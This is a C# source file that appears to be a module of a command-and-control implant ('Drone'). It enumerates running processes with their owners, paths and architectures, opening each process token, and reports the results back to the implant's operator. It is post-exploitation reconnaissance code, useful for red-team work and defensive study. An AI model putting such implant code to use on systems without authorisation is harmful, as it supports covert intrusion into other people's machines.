using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

using static Interop.Methods;
using static Interop.Data;

public sealed class ListProcesses : DroneCommand
{
    public override byte Command => 0x1B;
    public override bool Threaded => false;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        List<ProcessEntry> results = new();
        var processes = Process.GetProcesses();

        foreach (var process in processes)
        {
            results.Add(new ProcessEntry
            {
                ProcessId = process.Id,
                ParentProcessId = GetProcessParent(process),
                Name = process.ProcessName,
                Path = GetProcessPath(process),
                SessionId = process.SessionId,
                Owner = GetProcessOwner(process),
                Arch = GetProcessArch(process)
            });
        }

        await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.COMPLETE, results.Serialize()));
    }

    private static int GetProcessParent(Process process)
    {
        try
        {
            var pbi = QueryProcessBasicInformation(process.Handle);
            return pbi.InheritedFromUniqueProcessId;
        }
        catch
        {
            return 0;
        }
    }

    private static string GetProcessPath(Process process)
    {
        try
        {
            return process.MainModule?.FileName;
        }
        catch
        {
            return "-";
        }
    }

    private static string GetProcessOwner(Process process)
    {
        try
        {
            var hToken = OpenProcessToken(
                process.Handle,
                TOKEN_ACCESS.TOKEN_ALL_ACCESS);

            if (hToken == IntPtr.Zero)
                return string.Empty;

            using var identity = new WindowsIdentity(hToken);
            CloseHandle(hToken);

            return identity.Name;
        }
        catch
        {
            return "-";
        }
    }

    private static string GetProcessArch(Process process)
    {
        if (!Environment.Is64BitOperatingSystem)
            return "x86";
        
        try
        {
            return NtQueryInformationProcessWow64Information(process.Handle) ? "x86" : "x64";
        }
        catch
        {
            return "-";
        }
    }
}